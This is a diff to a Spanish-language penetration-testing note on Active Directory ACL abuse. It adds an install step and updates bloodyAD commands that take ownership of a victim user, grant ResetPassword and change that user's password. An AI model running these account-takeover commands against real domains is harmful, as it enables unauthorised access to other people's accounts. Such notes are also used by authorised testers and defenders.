@@ -6,10 +6,16 @@ Tags: #AD #ACL #Linux #Impacket #BloodyAD
 
 Si tenemos esta ACL sobre un **User**, podemos **cambiar el propietario del usuario**. Después podemos modificar su ACL, otorgarnos `ResetPassword` y **cambiar su contraseña**.
 
+
+```bash 
+# Instalación 
+❯ apt install bloodyad 
+```
+
 ```bash 
 Paso 1:
 # Cambiar propietario del usuario víctima a ControlledAccount
-❯ bloodyAD -d domain.local -u ControlledAccount -p 'PASSWORD' -H IP_DC set owner TargetUser ControlledAccount
+❯ bloodyad -d domain.local -u ControlledAccount -p 'PASSWORD' -H IP_DC set owner TargetUser ControlledAccount
 
 	# TargetUser = Usuario víctima (Objetivo)
 	# ControlledAccount = Usuario atacante (Controlas)
@@ -23,7 +29,7 @@ Paso 2:
 
 Paso 3:
 # Cambiar la contraseña del usuario víctima 
-❯ bloodyAD -d domain.local -u ControlledAccount -p 'PASSWORD' -H IP_DC set password TargetUser 'NuevaPassword123!'
+❯ bloodyad -d domain.local -u ControlledAccount -p 'PASSWORD' -H IP_DC set password TargetUser 'NuevaPassword123!'
 
 	# ControlledAccount = Usuario atacante (Controlas)
 	# p = Contraseña del usuario atacante 
